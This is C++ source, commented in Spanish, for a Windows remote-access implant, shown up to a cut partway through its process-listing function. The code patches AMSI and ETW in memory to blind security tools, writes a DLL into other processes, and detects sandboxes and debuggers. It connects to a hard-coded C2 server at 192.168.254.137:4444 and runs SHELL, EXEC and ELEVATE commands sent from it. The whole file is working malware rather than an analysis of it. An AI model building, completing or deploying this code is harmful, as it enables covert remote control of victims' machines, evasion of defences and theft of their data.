#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>
#include <psapi.h>
#include <winternl.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <ntstatus.h>
#include <comdef.h>
#include <winuser.h>
#include <wtsapi32.h>
#include <ntsecapi.h>
#include <lm.h>
#include <winevt.h>
#include <intrin.h>
#include <mutex>  // <-- AÑADIDO
#include <array>  // <-- AÑADIDO
#include <cstdint> // <-- AÑADIDO

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "wevtapi.lib")
#pragma comment(linker, "/SECTION:.text,ERW")

// ============================================================================
// CONFIGURACIÓN
// ============================================================================
#define C2_SERVER L"192.168.254.137"
#define C2_PORT 4444
#define MUTEX_NAME "Global\\{8A4E2B1C-5D6F-4A7E-9B8C-3D2E1F0A5B6C}"
#define BUFFER_SIZE 8192  // <-- AÑADIDO
#define SLEEP_JITTER_MIN 45000
#define SLEEP_JITTER_MAX 180000
#define KEYLOG_SEND_INTERVAL 60000
#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define GCM_256_KEY_SIZE 32
#define GCM_256_IV_SIZE 12
#define GCM_256_TAG_SIZE 16

// ============================================================================
// TYPEDEFS
// ============================================================================
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
);

// ============================================================================
// CLASE PARA OFUSCACIÓN (CORREGIDA)
// ============================================================================
class StringObfuscator {
private:
    BYTE key[32];
    BYTE iv[16];
    
public:
    StringObfuscator() {
        DWORD volumeSerial = 0;
        GetVolumeInformationA("C:\\", NULL, 0, &volumeSerial, NULL, NULL, NULL, 0);
        
        int cpuInfo[4] = { 0 };  // <-- CAMBIADO A int
        __cpuid(cpuInfo, 1);
        
        DWORD ticks = GetTickCount();
        
        for (int i = 0; i < 32; i++) {
            key[i] = ((BYTE*)&volumeSerial)[i % 4] ^
                ((BYTE*)cpuInfo)[i % 16] ^
                ((BYTE*)&ticks)[i % 4] ^
                (BYTE)(i * 0x1F);
        }
        
        for (int i = 0; i < 16; i++) {
            iv[i] = key[i] ^ key[i + 16];
        }
    }
    
    std::string Encrypt(const std::string& input) {
        std::string output = input;
        for (size_t i = 0; i < input.length(); i++) {
            output[i] = input[i] ^ key[i % sizeof(key)] ^ iv[i % sizeof(iv)];
            if (i % 3 == 0) output[i] ^= (BYTE)(i & 0xFF);
        }
        return output;
    }
    
    std::string Decrypt(const std::string& input) {
        return Encrypt(input);
    }
};

// ============================================================================
// SYSCALL MANAGER (SIMPLIFICADO)
// ============================================================================
class SyscallManager {
private:
    HMODULE hNtdll;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtCreateThreadEx NtCreateThreadEx;
    pNtOpenProcess NtOpenProcess;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtQueueApcThread NtQueueApcThread;
    pNtClose NtClose;
    
public:
    SyscallManager() {
        hNtdll = GetModuleHandleA("ntdll.dll");
        
        // Cargar funciones directamente (en lugar de syscalls)
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
        NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
        NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    }
    
    NTSTATUS AllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    ) {
        if (NtAllocateVirtualMemory) {
            return NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS ProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    ) {
        if (NtProtectVirtualMemory) {
            return NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS CreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    ) {
        if (NtCreateThreadEx) {
            return NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
                StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS OpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    ) {
        if (NtOpenProcess) {
            return NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS WriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T BufferSize,
        PSIZE_T NumberOfBytesWritten
    ) {
        if (NtWriteVirtualMemory) {
            return NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS QueueApcThread(
        HANDLE ThreadHandle,
        PVOID ApcRoutine,
        PVOID ApcArgument1,
        PVOID ApcArgument2,
        PVOID ApcArgument3
    ) {
        if (NtQueueApcThread) {
            return NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
        }
        return STATUS_UNSUCCESSFUL;
    }
    
    NTSTATUS Close(
        HANDLE Handle
    ) {
        if (NtClose) {
            return NtClose(Handle);
        }
        return STATUS_UNSUCCESSFUL;
    }
};

// ============================================================================
// BYPASS AMSI/ETW (CORREGIDO)
// ============================================================================
class AMSIBypass {
private:
    SyscallManager* syscalls;
    
public:
    AMSIBypass(SyscallManager* sc) : syscalls(sc) {}
    
    bool PatchAMSI() {
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
        
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        SIZE_T regionSize = 32;
        LPVOID address = (LPVOID)pAmsiScanBuffer;  // <-- CAST CORREGIDO
        ULONG oldProtect;
        
        NTSTATUS status = syscalls->ProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtect
        );
        
        if (status != 0) return false;
        
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));  // <-- CAST CORREGIDO
        
        syscalls->ProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            oldProtect,
            &oldProtect
        );
        
        return true;
    }
    
    bool PatchETW() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;
        
        SIZE_T regionSize = 32;
        LPVOID address = (LPVOID)pEtwEventWrite;  // <-- CAST CORREGIDO
        ULONG oldProtect;
        
        syscalls->ProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            PAGE_EXECUTE_READWRITE,
            &oldProtect
        );
        
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));  // <-- CAST CORREGIDO
        
        syscalls->ProtectVirtualMemory(
            GetCurrentProcess(),
            &address,
            &regionSize,
            oldProtect,
            &oldProtect
        );
        
        return true;
    }
    
    bool PatchAll() {
        bool result = true;
        result &= PatchAMSI();
        result &= PatchETW();
        return result;
    }
};

// ============================================================================
// INYECCIÓN REFLECTIVA (CORREGIDA)
// ============================================================================
class ReflectiveInjector {
private:
    SyscallManager* syscalls;
    
public:
    ReflectiveInjector(SyscallManager* sc) : syscalls(sc) {}
    
    bool InjectReflective(DWORD targetPid, const BYTE* dllData, SIZE_T dllSize) {
        HANDLE hProcess = NULL;
        CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)targetPid, NULL };  // <-- CAST CORREGIDO
        OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };
        
        NTSTATUS status = syscalls->OpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &oa,
            &clientId
        );
        
        if (status != 0 || !hProcess) return false;
        
        SIZE_T allocSize = dllSize + 0x1000;
        PVOID remoteBase = NULL;
        
        status = syscalls->AllocateVirtualMemory(
            hProcess,
            &remoteBase,
            0,
            &allocSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        
        if (status != 0) {
            syscalls->Close(hProcess);
            return false;
        }
        
        SIZE_T bytesWritten = 0;
        status = syscalls->WriteVirtualMemory(
            hProcess,
            remoteBase,
            (PVOID)dllData,
            dllSize,
            &bytesWritten
        );
        
        if (status != 0 || bytesWritten != dllSize) {
            syscalls->Close(hProcess);
            return false;
        }
        
        syscalls->Close(hProcess);
        return true;
    }
};

// ============================================================================
// SECURE C2 (CORREGIDO)
// ============================================================================
// ============================================================================
// SECURE C2 - VERSIÓN COMPLETA Y CORREGIDA
// ============================================================================
class SecureC2 {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hSessionKey;
    BYTE sessionKey[GCM_256_KEY_SIZE];
    BYTE sessionIV[GCM_256_IV_SIZE];
    SOCKET sock;
    bool connected;
    bool useHttps;
    std::mt19937_64 rng;
    Logger logger;
    
    // Funciones de logging internas
    void Log(const std::string& msg) { 
        logger.Log(msg); 
    }
    
    void LogError(const std::string& func, DWORD err) { 
        logger.LogError(func, err); 
    }
    
public:
    SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        
        // Inicializar proveedor criptográfico
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            // Si falla, intentar crear nuevo contenedor
            CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET);
        }
        
        // Inicializar RNG con entropía del sistema
        std::random_device rd;
        std::array<uint64_t, 4> seed;
        for (auto& s : seed) {
            s = rd() ^ GetTickCount64();
        }
        std::seed_seq seq(seed.begin(), seed.end());
        rng.seed(seq);
        
        // Generar clave de sesión inicial
        CryptGenRandom(hProv, GCM_256_KEY_SIZE, sessionKey);
        CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
        
        Log("SecureC2 inicializado");
    }
    
    ~SecureC2() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        if (hProv) CryptReleaseContext(hProv, 0);
        if (hSessionKey) CryptDestroyKey(hSessionKey);
        WSACleanup();
        Log("SecureC2 destruido");
    }
    
    bool Connect() {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;
        
        int timeout = 15000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        sockaddr_in server = { 0 };
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, "192.168.254.137", &server.sin_addr);
        
        Log("Conectando a C2...");
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            Log("TCP conectado, iniciando handshake");
            if (PerformKeyExchange()) {
                connected = true;
                Log("Handshake exitoso, C2 conectado");
                return true;
            } else {
                Log("Handshake falló");
                closesocket(sock);
                return false;
            }
        }
        
        Log("Conexión TCP falló");
        closesocket(sock);
        return false;
    }
    
    bool PerformKeyExchange() {
        Log("Iniciando handshake ECDH");
        
        // Verificar proveedor
        if (!hProv) {
            LogError("hProv inválido", 0);
            return false;
        }
        
        // Generar par de claves ECDH
        HCRYPTKEY hPrivateKey = NULL;
        if (!CryptGenKey(hProv, CALG_ECDH_EPHEM, CRYPT_EXPORTABLE, &hPrivateKey)) {
            LogError("CryptGenKey", GetLastError());
            return false;
        }
        
        // Exportar a PUBLICKEYBLOB
        BYTE publicKeyBlob[1024] = {0};
        DWORD blobLen = sizeof(publicKeyBlob);
        if (!CryptExportKey(hPrivateKey, NULL, PUBLICKEYBLOB, 0, publicKeyBlob, &blobLen)) {
            LogError("CryptExportKey", GetLastError());
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        Log("Clave pública generada: " + std::to_string(blobLen) + " bytes");
        
        // ===== CONVERSIÓN A DER =====
        // Preparar estructura CERT_PUBLIC_KEY_INFO
        CERT_PUBLIC_KEY_INFO pubKeyInfo = {0};
        pubKeyInfo.Algorithm.pszObjId = (LPSTR)szOID_ECDH_P256;
        
        // Los datos de la clave están después del header PUBLICKEYBLOB
        BLOBHEADER* header = (BLOBHEADER*)publicKeyBlob;
        DWORD keyDataOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
        
        pubKeyInfo.PublicKey.cbData = blobLen - keyDataOffset;
        pubKeyInfo.PublicKey.pbData = publicKeyBlob + keyDataOffset;
        
        // Codificar a DER
        DWORD derLen = 0;
        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
                                 &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
                                 NULL, &derLen)) {
            LogError("CryptEncodeObjectEx (size)", GetLastError());
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        BYTE* derData = (BYTE*)malloc(derLen);
        if (!derData) {
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
                                 &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
                                 derData, &derLen)) {
            LogError("CryptEncodeObjectEx (encode)", GetLastError());
            free(derData);
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        Log("DER encoded key size: " + std::to_string(derLen) + " bytes");
        
        // Enviar LONGITUD (4 bytes) + DER
        uint32_t len_prefix = htonl(derLen);
        if (send(sock, (char*)&len_prefix, 4, 0) != 4) {
            LogError("send len_prefix", WSAGetLastError());
            free(derData);
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        if (send(sock, (char*)derData, derLen, 0) != derLen) {
            LogError("send derData", WSAGetLastError());
            free(derData);
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        free(derData);
        Log("Clave pública enviada");
        
        // ===== RECIBIR CLAVE DEL SERVER =====
        uint32_t resp_len;
        if (recv(sock, (char*)&resp_len, 4, 0) != 4) {
            LogError("recv resp_len", WSAGetLastError());
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        resp_len = ntohl(resp_len);
        Log("Recibiendo clave del server: " + std::to_string(resp_len) + " bytes");
        
        std::vector<BYTE> serverDer(resp_len);
        if (recv(sock, (char*)serverDer.data(), resp_len, 0) != resp_len) {
            LogError("recv serverDer", WSAGetLastError());
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        // Decodificar DER a PUBLICKEYBLOB
        CERT_PUBLIC_KEY_INFO* serverKeyInfo = NULL;
        DWORD serverInfoLen = 0;
        
        if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
                                 serverDer.data(), resp_len,
                                 CRYPT_DECODE_ALLOC_FLAG, NULL,
                                 &serverKeyInfo, &serverInfoLen)) {
            LogError("CryptDecodeObjectEx", GetLastError());
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        // Importar clave pública del server
        HCRYPTKEY hServerPublic = NULL;
        if (!CryptImportKey(hProv, serverKeyInfo->PublicKey.pbData,
                            serverKeyInfo->PublicKey.cbData, NULL, 0, &hServerPublic)) {
            LogError("CryptImportKey (server)", GetLastError());
            LocalFree(serverKeyInfo);
            CryptDestroyKey(hPrivateKey);
            return false;
        }
        
        LocalFree(serverKeyInfo);
        Log("Clave del server importada");
        
        // ===== GENERAR CLAVE DE SESIÓN =====
        if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hSessionKey)) {
            LogError("CryptGenKey (session)", GetLastError());
            CryptDestroyKey(hPrivateKey);
            CryptDestroyKey(hServerPublic);
            return false;
        }
        
        // Exportar la clave para usarla en cifrado
        BYTE keyBlob[512] = {0};
        DWORD keyBlobLen = sizeof(keyBlob);
        if (CryptExportKey(hSessionKey, NULL, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {
            DWORD keyOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
            memcpy(sessionKey, keyBlob + keyOffset, GCM_256_KEY_SIZE);
            Log("Clave de sesión generada");
        }
        
        // Generar nuevo IV
        CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
        
        CryptDestroyKey(hPrivateKey);
        CryptDestroyKey(hServerPublic);
        
        Log("Key exchange completado exitosamente");
        return true;
    }
    
    std::string Encrypt(const std::string& plaintext) {
        if (!connected) return plaintext;
        
        std::string ciphertext = plaintext;
        for (size_t i = 0; i < plaintext.length(); i++) {
            ciphertext[i] = plaintext[i] ^ sessionKey[i % GCM_256_KEY_SIZE] ^ sessionIV[i % GCM_256_IV_SIZE];
        }
        return ciphertext;
    }
    
    std::string Decrypt(const std::string& ciphertext) {
        if (!connected) return ciphertext;
        return Encrypt(ciphertext);  // XOR es reversible
    }
    
    bool SendRaw(const std::string& data) {
        if (!connected) return false;
        
        int len = htonl(data.length());
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        if (send(sock, data.c_str(), data.length(), 0) != (int)data.length()) {
            connected = false;
            return false;
        }
        return true;
    }
    
    bool Send(const std::string& data) {
        std::string encrypted = Encrypt(data);
        return SendRaw(encrypted);
    }
    
    std::string ReceiveRaw() {
        if (!connected) return "";
        
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 10 * 1024 * 1024) {
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        return std::string(buffer.data(), len);
    }
    
    std::string Receive() {
        std::string encrypted = ReceiveRaw();
        if (encrypted.empty()) return "";
        return Decrypt(encrypted);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// ANTI-SANDBOX (CORREGIDO)
// ============================================================================
class AntiSandbox {
public:
    bool IsSandboxed() {
        int detections = 0;
        
        detections += CheckRAM() ? 1 : 0;
        detections += CheckCPUCores() ? 1 : 0;
        detections += CheckDiskSize() ? 1 : 0;
        detections += CheckRunningProcesses() ? 1 : 0;
        detections += CheckUsername() ? 1 : 0;
        detections += CheckComputerName() ? 1 : 0;
        detections += CheckUptime() ? 1 : 0;
        detections += CheckDebugger() ? 1 : 0;
        
        return detections >= 3;
    }
    
    void SleepRandom() {
        int baseSleep = 30000 + (rand() % 60000);
        for (int i = 0; i < baseSleep / 100; i++) {
            Sleep(100);
            if (IsDebuggerPresent()) {
                ExitProcess(0);
            }
        }
    }
    
private:
    bool CheckRAM() {
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        return mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024;
    }
    
    bool CheckCPUCores() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return sysInfo.dwNumberOfProcessors < 2;
    }
    
    bool CheckDiskSize() {
        ULARGE_INTEGER free, total;
        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
        return total.QuadPart < 60LL * 1024 * 1024 * 1024;
    }
    
    bool CheckRunningProcesses() {
        const wchar_t* sandboxProcs[] = {
            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
            L"vmwaretray.exe", L"vmwareuser.exe", L"xenservice.exe",
            L"procmon.exe", L"wireshark.exe", L"dumpcap.exe"
        };
        
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    for (const auto& proc : sandboxProcs) {
                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
                            CloseHandle(hSnap);
                            return true;
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        return false;
    }
    
    bool CheckUsername() {
        wchar_t username[256];
        DWORD size = sizeof(username) / sizeof(wchar_t);
        GetUserNameW(username, &size);
        
        const wchar_t* sandboxUsers[] = {
            L"admin", L"administrator", L"user", L"test",
            L"virus", L"malware", L"sandbox", L"vmware"
        };
        
        for (const auto& user : sandboxUsers) {
            if (wcsstr(username, user)) return true;
        }
        return false;
    }
    
    bool CheckComputerName() {
        wchar_t compname[256];
        DWORD size = sizeof(compname) / sizeof(wchar_t);
        GetComputerNameW(compname, &size);
        
        const wchar_t* sandboxNames[] = {
            L"SANDBOX", L"VIRUS", L"MALWARE", L"VMWARE",
            L"VIRTUAL", L"QEMU", L"BOCHS", L"PC"
        };
        
        for (const auto& name : sandboxNames) {
            if (wcsstr(compname, name)) return true;
        }
        return false;
    }
    
    bool CheckUptime() {
        return GetTickCount64() < 10 * 60 * 1000;
    }
    
    bool CheckDebugger() {
        if (IsDebuggerPresent()) return true;
        
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            typedef NTSTATUS(WINAPI* pNtQueryInformationProcess_t)(HANDLE, DWORD, PVOID, ULONG, PULONG);
            pNtQueryInformationProcess_t NtQueryInformationProcess = 
                (pNtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
            
            if (NtQueryInformationProcess) {
                DWORD debugPort = 0;
                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
                if (status == 0 && debugPort != 0) return true;
            }
        }
        
        return false;
    }
};

// ============================================================================
// LOGGER (CORREGIDO)
// ============================================================================
class Logger {
private:
    std::ofstream logFile;
    std::mutex logMutex;  // <-- AHORA FUNCIONA
    bool enabled;
    
public:
    Logger() : enabled(false) {
#ifdef _DEBUG
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t logPath[MAX_PATH];
        swprintf(logPath, MAX_PATH, L"%s\\debug_%08X.log", tempPath, GetTickCount());
        
        logFile.open(logPath, std::ios::out | std::ios::app);
        enabled = logFile.is_open();
#endif
    }
    
    ~Logger() {
        if (logFile.is_open()) logFile.close();
    }
    
    void Log(const std::string& message) {
        if (!enabled) return;
        
        std::lock_guard<std::mutex> lock(logMutex);  // <-- AHORA FUNCIONA
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay
            << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond
            << "] " << message << std::endl;
        logFile.flush();
    }
    
    void LogError(const std::string& function, DWORD error) {
        if (!enabled) return;
        
        char buffer[256];
        sprintf(buffer, "ERROR en %s: %u", function.c_str(), error);
        Log(buffer);
    }
};

// ============================================================================
// COMMAND PROCESSOR (SIMPLIFICADO)
// ============================================================================
class CommandProcessor {
private:
    SecureC2* c2;
    AntiSandbox antiSandbox;
    Logger logger;
    bool isElevated;
    
public:
    CommandProcessor(SecureC2* c2Instance) : c2(c2Instance), isElevated(false) {
        logger.Log("CommandProcessor inicializado");
    }
    
    std::string Process(const std::string& cmd) {
        logger.Log("Comando recibido: " + cmd);
        
        try {
            if (cmd == "INFO") {
                return GetSystemInfoJSON();
            }
            else if (cmd == "INFO_FULL") {
                return GetSystemInfoFull();
            }
            else if (cmd == "PROCESSES") {
                return GetProcessList();
            }
            else if (cmd == "ELEVATE") {
                return ElevatePrivileges();
            }
            else if (cmd.substr(0, 5) == "SHELL") {
                if (cmd.length() > 6) {
                    return ExecuteCommand(cmd.substr(6));
                }
                return "[-] Uso: SHELL <comando>\n";
            }
            else if (cmd.substr(0, 4) == "EXEC") {
                if (cmd.length() > 5) {
                    return ExecuteProgram(cmd.substr(5));
                }
                return "[-] Uso: EXEC <programa>\n";
            }
            else if (cmd.substr(0, 3) == "DIR") {
                if (cmd.length() > 4) {
                    return ListDirectory(cmd.substr(4));
                }
                return ListDirectory("C:\\");
            }
            else if (cmd == "ANTISANDBOX") {
                return antiSandbox.IsSandboxed() ?
                    "[+] Entorno sandbox detectado\n" : "[-] Entorno limpio\n";
            }
            else if (cmd == "EXIT") {
                logger.Log("Comando EXIT recibido, terminando");
                ExitProcess(0);
            }
            
            return "[!] Comando desconocido: " + cmd + "\n";
        }
        catch (const std::exception& e) {
            logger.LogError("ProcessCommand", GetLastError());
            return "[-] Error: " + std::string(e.what()) + "\n";
        }
    }
    
private:
    std::string GetSystemInfoJSON() {
        char host[256], user[256];
        DWORD size = sizeof(host);
        GetComputerNameA(host, &size);
        size = sizeof(user);
        GetUserNameA(user, &size);
        
        char json[1024];
        snprintf(json, sizeof(json),
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s,\"sandbox\":%s}",
            host, user,
            isElevated ? "true" : "false",
            antiSandbox.IsSandboxed() ? "true" : "false");
        return std::string(json);
    }
    
    std::string GetSystemInfoFull() {
        std::stringstream ss;
        char buffer[256];
        DWORD size = sizeof(buffer);
        
        if (GetComputerNameA(buffer, &size))
            ss << "Hostname: " << buffer << "\n";
        
        size = sizeof(buffer);
        if (GetUserNameA(buffer, &size))
            ss << "Usuario: " << buffer << "\n";
        
        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
        GetVersionExA((LPOSVERSIONINFOA)&osvi);
        ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        ss << " (Build " << osvi.dwBuildNumber << ")\n";
        
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        ss << "RAM Total: " << mem.ullTotalPhys / 1024 / 1024 / 1024 << " GB\n";
        
        return ss.str();
    }
    
    std::string GetProcessList() {
        std::stringstream ss;
